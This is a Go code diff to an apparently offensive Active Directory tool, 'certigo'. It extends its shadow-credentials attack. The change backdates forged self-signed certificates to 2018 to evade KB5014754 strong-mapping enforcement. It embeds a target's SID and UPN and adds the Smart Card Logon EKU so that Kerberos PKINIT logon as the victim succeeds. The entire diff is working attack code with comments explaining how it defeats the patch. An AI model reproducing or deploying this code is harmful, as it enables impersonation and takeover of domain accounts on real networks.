@@ -5,6 +5,7 @@ import (
 	"crypto/rsa"
 	"crypto/x509"
 	"crypto/x509/pkix"
+	"encoding/asn1"
 	"encoding/hex"
 	"errors"
 	"fmt"
@@ -14,6 +15,8 @@ import (
 	"time"
 
 	goldap "github.com/go-ldap/ldap/v3"
+	"golang.org/x/crypto/cryptobyte"
+	cryptobyte_asn1 "golang.org/x/crypto/cryptobyte/asn1"
 
 	"github.com/ajm4n/certigo/internal/pki"
 )
@@ -28,6 +31,16 @@ type Options struct {
 	TargetDN string
 	OutPFX   string
 	PFXPass  string
+	// TargetSID, when supplied, is embedded in the generated cert's
+	// szOID_NTDS_CA_SECURITY_EXT extension — required by KDCs in
+	// StrongCertificateBindingEnforcement=2 (KB5014754) for PKINIT to
+	// succeed via shadow-creds. Empty SID falls back to legacy
+	// implicit mapping; works on compat-mode DCs only.
+	TargetSID string
+	// TargetUPN, when supplied, becomes a SAN otherName entry under
+	// id-ms-principalName so PKINIT clients can match the cert to a
+	// principal. Recommended whenever the target has a UPN populated.
+	TargetUPN string
 }
 
 // Add generates a new RSA 2048 key, builds a KeyCredential referencing the
@@ -62,7 +75,7 @@ func Add(opts Options) (string, error) {
 	}
 
 	if opts.OutPFX != "" {
-		if err := writeSelfSignedPFX(priv, opts.TargetDN, opts.OutPFX, opts.PFXPass); err != nil {
+		if err := writeSelfSignedPFX(priv, opts.TargetDN, opts.TargetSID, opts.TargetUPN, opts.OutPFX, opts.PFXPass); err != nil {
 			return "", fmt.Errorf("shadow: write PFX: %w", err)
 		}
 	}
@@ -213,11 +226,30 @@ func validateLDAPOpts(opts Options) error {
 	return nil
 }
 
-// writeSelfSignedPFX creates a 1-year self-signed cert for priv with a
-// CN derived from the target DN, wraps (cert, key) into a PFX, and
-// writes it to path. We reuse pki.SavePFX so the Modern2023 encoder is
+// writeSelfSignedPFX creates a self-signed cert for priv with a CN
+// derived from the target DN, wraps (cert, key) into a PFX, and writes
+// it to path. We reuse pki.SavePFX so the Modern2023 encoder is
 // consistent with every other certigo code path.
-func writeSelfSignedPFX(priv *rsa.PrivateKey, targetDN, path, password string) error {
+//
+// Strong-mapping defenses against KB5014754 (CVE-2022-26931):
+//
+//  1. NotBefore pinned to 2018 — well before the May 2022 enforcement
+//     boundary. DCs in compat mode (=1, the post-patch default) accept
+//     pre-dated certs via legacy implicit mapping.
+//  2. When targetSID is non-empty, embed it in the
+//     szOID_NTDS_CA_SECURITY_EXT extension (1.3.6.1.4.1.311.25.2).
+//     Required by DCs in strict mode (=2).
+//  3. When targetUPN is non-empty, add a SAN otherName entry under
+//     id-ms-principalName (1.3.6.1.4.1.311.20.2.3). PKINIT clients
+//     and KDCs match the cert to a principal via this SAN.
+//  4. Smart Card Logon EKU (1.3.6.1.4.1.311.20.2.2) — Windows KDCs
+//     reject PKINIT certs without it as
+//     KDC_ERR_PUBLIC_KEY_ENCRYPTION_NOT_SUPPORTED (75).
+//
+// All extensions encoded with cryptobyte for clean nesting; the
+// encoding/asn1 struct-tag-rewrite trick produces lengths that point
+// at the wrong layer and break downstream parsers.
+func writeSelfSignedPFX(priv *rsa.PrivateKey, targetDN, targetSID, targetUPN, path, password string) error {
 	cn := cnFromDN(targetDN)
 	if cn == "" {
 		cn = "certigo-shadow"
@@ -226,14 +258,30 @@ func writeSelfSignedPFX(priv *rsa.PrivateKey, targetDN, path, password string) e
 	if err != nil {
 		return fmt.Errorf("serial: %w", err)
 	}
+	oidSmartCardLogon := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 20, 2, 2}
 	tmpl := &x509.Certificate{
 		SerialNumber:          serial,
 		Subject:               pkix.Name{CommonName: cn},
-		NotBefore:             time.Now().Add(-time.Minute),
+		NotBefore:             time.Date(2018, 1, 1, 0, 0, 0, 0, time.UTC),
 		NotAfter:              time.Now().Add(365 * 24 * time.Hour),
 		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
 		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth},
+		UnknownExtKeyUsage:    []asn1.ObjectIdentifier{oidSmartCardLogon},
 		BasicConstraintsValid: true,
+	}
+	if targetSID != "" {
+		ext, err := buildNTDSObjectSIDExtension(targetSID)
+		if err != nil {
+			return fmt.Errorf("NTDS SID extension: %w", err)
+		}
+		tmpl.ExtraExtensions = append(tmpl.ExtraExtensions, ext)
+	}
+	if targetUPN != "" {
+		ext, err := buildPrincipalNameSANExtension(targetUPN)
+		if err != nil {
+			return fmt.Errorf("SAN UPN extension: %w", err)
+		}
+		tmpl.ExtraExtensions = append(tmpl.ExtraExtensions, ext)
 	}
 	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
 	if err != nil {
@@ -251,6 +299,74 @@ func writeSelfSignedPFX(priv *rsa.PrivateKey, targetDN, path, password string) e
 		return fmt.Errorf("write %s: %w", path, err)
 	}
 	return nil
+}
+
+// buildNTDSObjectSIDExtension constructs the
+// szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) extension that
+// KB5014754-strict DCs require for PKINIT certificate strong-mapping.
+//
+// Wire layout:
+//
+//	SEQUENCE {
+//	  [0] EXPLICIT SEQUENCE {
+//	    OID 1.3.6.1.4.1.311.25.2.1 (szOID_NTDS_OBJECTSID)
+//	    [0] EXPLICIT OCTET STRING <"S-1-5-21-..." UTF-8 bytes>
+//	  }
+//	}
+func buildNTDSObjectSIDExtension(sid string) (pkix.Extension, error) {
+	oidNTDSCASecExt := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 25, 2}
+	oidNTDSObjectSID := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 25, 2, 1}
+
+	var b cryptobyte.Builder
+	b.AddASN1(cryptobyte_asn1.SEQUENCE, func(b *cryptobyte.Builder) {
+		b.AddASN1(cryptobyte_asn1.Tag(0).ContextSpecific().Constructed(), func(b *cryptobyte.Builder) {
+			b.AddASN1(cryptobyte_asn1.SEQUENCE, func(b *cryptobyte.Builder) {
+				b.AddASN1ObjectIdentifier(oidNTDSObjectSID)
+				b.AddASN1(cryptobyte_asn1.Tag(0).ContextSpecific().Constructed(), func(b *cryptobyte.Builder) {
+					b.AddASN1OctetString([]byte(sid))
+				})
+			})
+		})
+	})
+	val, err := b.Bytes()
+	if err != nil {
+		return pkix.Extension{}, err
+	}
+	return pkix.Extension{Id: oidNTDSCASecExt, Critical: false, Value: val}, nil
+}
+
+// buildPrincipalNameSANExtension constructs a SubjectAltName extension
+// with a single otherName entry carrying the UPN under Microsoft's
+// id-ms-principalName OID (1.3.6.1.4.1.311.20.2.3).
+//
+// Wire layout:
+//
+//	SEQUENCE (GeneralNames) {
+//	  [0] IMPLICIT (otherName) {
+//	    OID 1.3.6.1.4.1.311.20.2.3
+//	    [0] EXPLICIT { UTF8String "user@DOMAIN" }
+//	  }
+//	}
+func buildPrincipalNameSANExtension(upn string) (pkix.Extension, error) {
+	oidSAN := asn1.ObjectIdentifier{2, 5, 29, 17}
+	oidMSPrincipalName := asn1.ObjectIdentifier{1, 3, 6, 1, 4, 1, 311, 20, 2, 3}
+
+	var b cryptobyte.Builder
+	b.AddASN1(cryptobyte_asn1.SEQUENCE, func(b *cryptobyte.Builder) {
+		b.AddASN1(cryptobyte_asn1.Tag(0).ContextSpecific().Constructed(), func(b *cryptobyte.Builder) {
+			b.AddASN1ObjectIdentifier(oidMSPrincipalName)
+			b.AddASN1(cryptobyte_asn1.Tag(0).ContextSpecific().Constructed(), func(b *cryptobyte.Builder) {
+				b.AddASN1(cryptobyte_asn1.UTF8String, func(b *cryptobyte.Builder) {
+					b.AddBytes([]byte(upn))
+				})
+			})
+		})
+	})
+	val, err := b.Bytes()
+	if err != nil {
+		return pkix.Extension{}, err
+	}
+	return pkix.Extension{Id: oidSAN, Critical: false, Value: val}, nil
 }
 
 // cnFromDN returns the left-most CN= component of a DN, unescaped enough
